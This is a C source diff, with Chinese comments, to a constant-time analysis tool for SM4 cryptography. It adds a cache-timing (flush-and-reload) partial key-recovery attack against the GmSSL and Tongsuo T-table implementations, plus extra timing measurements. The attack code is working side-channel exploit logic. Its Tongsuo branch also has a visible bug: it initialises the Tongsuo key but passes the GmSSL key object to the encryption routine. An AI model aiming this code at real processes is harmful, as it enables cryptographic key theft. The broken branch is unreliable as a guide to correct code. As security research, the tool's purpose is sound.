@@ -568,6 +568,28 @@ static uint64_t measure_tongsuo(const tongsuo_sm4_key* k, int cls) {
     return t1 - t0;
 }
 
+/* pristine 构建（与上游默认编译一致）——统计检测用这一份；
+ * /Dstatic= 构建——缓存观测用那一份。两者代码生成不同，不能混用。 */
+extern void ts_plain_encrypt(const uint8_t *in, uint8_t *out, const void *ks);
+extern int  ts_plain_set_key(const uint8_t *key, void *ks);
+
+static uint64_t measure_tongsuo_pristine(const tongsuo_sm4_key* k, int cls) {
+    uint8_t in[16], out[16];
+    gen_input(in, cls);
+    /* pristine 构建不暴露内部表，无法 flush；这与真实攻击者面对的情形一致 */
+    fence_all();
+    uint64_t t0 = now_cycles();
+    ts_plain_encrypt(in, out, k);
+    fence_all();
+    uint64_t t1 = now_cycles();
+    g_sink ^= (uint32_t)out[0];
+    return t1 - t0;
+}
+
+static uint64_t tongsuo_pristine_fn(const void* k, int cls) {
+    return measure_tongsuo_pristine((const tongsuo_sm4_key*)k, cls);
+}
+
 static uint64_t tongsuo_fn(const void* k, int cls) { return measure_tongsuo((const tongsuo_sm4_key*)k, cls); }
 
 /* ------------------------------------------------------------------ 多库横向对比（机器可读输出）
@@ -583,12 +605,20 @@ static int cmd_libs(int n, int reps) {
     gmssl_sm4_key ktt;   sm4_set_encrypt_key(&ktt, K);
     tongsuo_sm4_key kts; ossl_sm4_set_key(K, &kts);
 
+    /* 三种口径并列，避免把"测不到"误读成"没有"：
+     *   GmSSL        pristine 构建，表是外部符号 → 可 flush（真实攻击者视野）
+     *   Tongsuo-obs  暴露内部表的构建（instrumented），表可 flush
+     *   Tongsuo-pri  pristine 构建，表为 static → 外部无法 flush，信号被缓存常驻掩盖
+     */
     struct { const char* name; uint64_t (*fn)(const void*, int); const void* key; } libs[] = {
-        { "GmSSL",   tt_fn,      &ktt },
-        { "Tongsuo", tongsuo_fn, &kts },
+        { "GmSSL", tt_fn, &ktt },
+        { "Tongsuo-obs", tongsuo_fn, &kts },
+        { "Tongsuo-pri", tongsuo_pristine_fn, &kts },
     };
 
-    printf("# 横向对比：%d 个国产库，每个重复 %d 轮取中位，每类 %d 样本\n", (int)(sizeof(libs)/sizeof(libs[0])), reps, n);
+    printf("# 横向对比：%d 个口径，每个重复 %d 轮取中位，每类 %d 样本\n",
+           (int)(sizeof(libs)/sizeof(libs[0])), reps, n);
+    printf("# -obs = 暴露内部表的构建（可 flush）；-pri = pristine 构建（表为 static，外部无法 flush）\n");
     for (unsigned i = 0; i < sizeof(libs)/sizeof(libs[0]); i++) {
         double ts[16], eff = 0;
         if (reps > 16) reps = 16;
@@ -740,7 +770,7 @@ static int cmd_sweep(int reps, int n) {
         { "our T-table",        our_tt_fn,    &kours, 1 },
         { "GmSSL T-table",      tt_fn,        &ktt,   1 },
         { "GmSSL small-table",  small_fn,     &ksm,   1 },
-        { "Tongsuo T-table",    tongsuo_fn,   &kts,   1 },
+        { "Tongsuo T-table",    tongsuo_pristine_fn, &kts, 1 },
         { "our const-time",     our_ct_fn,    &kours, 0 },
         { "our const-time rev", our_ctrev_fn, &kours, 0 },
         { "null baseline",      null_fn,      NULL,   0 },
@@ -786,7 +816,177 @@ static int cmd_sweep(int reps, int n) {
     return 0;
 }
 
+
+/* ------------------------------------------------------------------ 真实库：部分密钥恢复
+ *
+ * 目标：在 GmSSL 的真实布局（4 KB T-table，16 项/缓存行）上做**部分**信息恢复。
+ *
+ * 为什么只能到"部分"：
+ *   一行 64 字节装 16 个 4 字节表项，观测到的只是"落在哪一行"。
+ *   同一行的 16 个候选完全不可区分 → 每个字节最多得到高 4 bit。
+ *
+ * 为什么仍然不是零信息（这是关键）：
+ *   目标轮访问的那一行必然在命中集合里：      P(hit | 正确候选) ≈ 1
+ *   错误候选对应另一行，被剩余 31 轮碰到的概率：P(hit | 错误候选) = 1-(15/16)^31 ≈ 86.5%
+ *   于是"预测行是否命中"就构成一个判别器：正确候选组接近 100%，其余约 86.5%。
+ */
+#define REAL_LINES_PER_TABLE (1024 / 64)   /* 每张表 1024 字节 = 16 条缓存行 */
+
+/* 当前被攻击的实现：表指针与加密函数必须配套 */
+static const uint32_t* g_rt[4] = { 0, 0, 0, 0 };
+static void (*g_real_encrypt)(const void* ks, const uint8_t* in, uint8_t* out) = 0;
+
+static void gmssl_real_encrypt(const void* ks, const uint8_t* in, uint8_t* out) {
+    sm4_encrypt((const gmssl_sm4_key*)ks, in, out);
+}
+static void tongsuo_real_encrypt(const void* ks, const uint8_t* in, uint8_t* out) {
+    ossl_sm4_encrypt(in, out, ks);
+}
+
+static int cmp_int_desc(const void* a, const void* b) {
+    int x = *(const int*)a, y = *(const int*)b;
+    return (y > x) - (y < x);
+}
+
+static int cmd_attack_real(const char* lib, int traces) {
+    static const uint8_t K[16] = {0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10};
+    gmssl_sm4_key k;
+    gmssl_small_key ksm2;
+    tongsuo_sm4_key kts;
+    uint32_t true_rk0 = 0;
+
+    if (!strcmp(lib, "tongsuo")) {
+        ossl_sm4_set_key(K, &kts);
+        g_rt[0] = SM4_SBOX_T0; g_rt[1] = SM4_SBOX_T1; g_rt[2] = SM4_SBOX_T2; g_rt[3] = SM4_SBOX_T3;
+        g_real_encrypt = tongsuo_real_encrypt;
+        true_rk0 = ((const tongsuo_sm4_key*)&kts)->rk[0];
+        printf("=== Tongsuo 官方实现（4 KB T-table，16 项/缓存行）===\n");
+    } else {
+        sm4_set_encrypt_key(&k, K);
+        g_rt[0] = T0; g_rt[1] = T1; g_rt[2] = T2; g_rt[3] = T3;
+        g_real_encrypt = gmssl_real_encrypt;
+        true_rk0 = k.rk[0];
+        printf("=== GmSSL 官方实现（4 KB T-table，16 项/缓存行）===\n");
+    }
+    (void)ksm2;
+
+    /* 标定函数用的是自研表的地址；这里必须先分配，否则拿 NULL 去 clflush */
+    if (sm4_tables_alloc(4) != 0) { printf("alloc failed\n"); return 1; }
+    calibrate_threshold();
+
+    /* 表起点不一定 64 字节对齐，行号必须按实际偏移算 */
+    size_t off[4], lines_of[4], total = 0;
+    for (int t4 = 0; t4 < 4; t4++) {
+        off[t4] = ((uintptr_t)g_rt[t4]) % 64;
+        lines_of[t4] = (off[t4] + 256 * sizeof(uint32_t) + 63) / 64;
+        total += lines_of[t4];
+    }
+    uint8_t* hit = (uint8_t*)malloc(total);
+    uint8_t (*pts)[16] = (uint8_t(*)[16])malloc((size_t)traces * 16);
+    if (!hit || !pts) { printf("oom\n"); return 1; }
+
+    /* 乱序探测，避免预取器造成假命中 */
+    size_t* order = (size_t*)malloc(total * sizeof(size_t));
+    for (size_t i = 0; i < total; i++) order[i] = i;
+    for (size_t i = total; i > 1; i--) {
+        size_t j = (size_t)(rng() % (uint32_t)i);
+        size_t t = order[i-1]; order[i-1] = order[j]; order[j] = t;
+    }
+
+    printf("  trace 数：%d　目标：恢复 rk[0] 每个字节的**高 4 bit**（行号）\n", traces);
+
+    /* 累计得分：4 个字节 × 256 个候选 */
+    static int score[4][256];
+    memset(score, 0, sizeof(score));
+
+    uint8_t out[16];
+    for (int n = 0; n < traces; n++) {
+        for (int i = 0; i < 16; i += 4) { uint32_t r = rng(); memcpy(pts[n] + i, &r, 4); }
+
+        for (int t3 = 0; t3 < 4; t3++) flush_block((void*)g_rt[t3], sizeof(uint32_t) * 256);
+
+        g_real_encrypt(&k, pts[n], out);
+        g_sink ^= out[0];
+
+        for (size_t t2 = 0; t2 < total; t2++) {
+            size_t idx = order[t2];
+            /* 展开全局下标 → (表, 行) */
+            int tab = 0;
+            size_t line = idx;
+            while (line >= lines_of[tab]) { line -= lines_of[tab]; tab++; }
+            const volatile char* p =
+                (const volatile char*)((const char*)g_rt[tab] - off[tab] + line * 64);
+            fence_all();
+            uint64_t c0 = now_cycles();
+            volatile char v = *p;
+            fence_all();
+            uint64_t c1 = now_cycles();
+            (void)v;
+            hit[idx] = ((c1 - c0) <= g_threshold_hit) ? 1 : 0;
+        }
+
+        /* 第 0 轮：t = X1 ^ X2 ^ X3（明文已知，轮密钥未知） */
+        uint32_t w[4];
+        for (int ww = 0; ww < 4; ww++)
+            w[ww] = ((uint32_t)pts[n][ww*4] << 24) | ((uint32_t)pts[n][ww*4+1] << 16) |
+                    ((uint32_t)pts[n][ww*4+2] << 8) | (uint32_t)pts[n][ww*4+3];
+        uint32_t t = w[1] ^ w[2] ^ w[3];
+
+        for (int j = 0; j < 4; j++) {
+            uint8_t tb = (uint8_t)(t >> (24 - 8 * j));
+            size_t base_global = 0;
+            for (int t5 = 0; t5 < j; t5++) base_global += lines_of[t5];
+            for (int g = 0; g < 256; g++) {
+                size_t line = (off[j] + (size_t)(tb ^ (uint8_t)g) * 4) / 64;
+                if (line >= lines_of[j]) line = lines_of[j] - 1;
+                score[j][g] += hit[base_global + line];
+            }
+        }
+    }
+
+    /* 统计结果 */
+    const uint32_t true_rk = true_rk0;
+    int total_hit_lines_correct = 0, total_guesses = 0;
+    printf("\n  %-6s %-10s %-28s %-10s %s\n", "字节", "真实高4位", "得分最高的 16 个候选(高4位)", "正确组得分", "其余组均值");
+    for (int j = 0; j < 4; j++) {
+        uint8_t true_byte = (uint8_t)(true_rk >> (24 - 8 * j));
+        int true_hi = true_byte >> 4;
+
+        /* 按组统计：同一个高 4 bit 的 16 个候选得分相同 */
+        int group_score[16];
+        for (int hi = 0; hi < 16; hi++) group_score[hi] = score[j][hi << 4];
+
+        int sorted[16];
+        memcpy(sorted, group_score, sizeof(sorted));
+        qsort(sorted, 16, sizeof(int), cmp_int_desc);
+        int best = sorted[0], second = sorted[1];
+
+        int hi_best = 0;
+        for (int hi = 0; hi < 16; hi++) if (group_score[hi] == best) { hi_best = hi; break; }
+
+        int sum_other = 0;
+        for (int hi = 0; hi < 16; hi++) if (hi != true_hi) sum_other += group_score[hi];
+
+        printf("  b%-5d 0x%-8x 最高组=0x%-2x (%d/%d)        %-10.1f %.1f\n",
+               j, true_hi, hi_best, best, traces,
+               (double)group_score[true_hi], (double)sum_other / 15.0);
+
+        if (hi_best == true_hi) total_hit_lines_correct++;
+        total_guesses++;
+    }
+
+    printf("\n  说明：同一缓存行内的 16 个候选得分完全相同（行粒度不可区分），\n");
+    printf("        因此每个字节只能确定高 4 bit；低 4 bit 需要更细的观测通道。\n");
+    printf("  结果：%d/%d 个字节的高 4 bit 与真实值一致。\n", total_hit_lines_correct, total_guesses);
+
+    free(hit); free(pts); free(order);
+    /* 退出码只表示实验是否正常跑完；恢复成功与否写在输出里。
+     * 若用退出码表示“没恢复出来”，报告链路会把一次合法的负结果当成故障。 */
+    return 0;
+}
+
 /* ------------------------------------------------------------------ main */
+
 static void usage(void) {
     printf("hengshi - 面向国密实现的常量时间性检测与密钥泄漏定位\n\n");
     printf("用法:\n");
@@ -798,6 +998,7 @@ static void usage(void) {
     printf("  hengshi compare [n]                     同库两种表布局对比（默认 n=40000）\n");
     printf("  hengshi libs [n] [reps]                 多库横向对比（GmSSL / Tongsuo）\n");
     printf("  hengshi sweep [reps] [n]                假阳性评估（默认 10 轮 / 20000 样本）\n");
+    printf("  hengshi attack-real [lib] [traces]      真实库部分密钥恢复（lib=gmssl|tongsuo）\n");
     printf("  hengshi heat [stride] [file.csv]        导出单条 trace 的缓存行命中图\n");
     printf("  hengshi all                             依次跑 verify + ttest + converge + attack\n");
 }
@@ -850,6 +1051,13 @@ int main(int argc, char** argv) {
         int n = (argc > 2) ? atoi(argv[2]) : 40000;
         if (n < 2000) n = 2000;
         return cmd_compare(n);
+    }
+    if (!strcmp(cmd, "attack-real")) {
+        const char* lib = (argc > 2) ? argv[2] : "gmssl";
+        int traces = (argc > 3) ? atoi(argv[3]) : 1000;
+        if (traces < 100) traces = 100;
+        if (traces > 20000) traces = 20000;
+        return cmd_attack_real(lib, traces);
     }
     if (!strcmp(cmd, "heat")) {
         size_t stride = (argc > 2) ? (size_t)atoi(argv[2]) : 64;
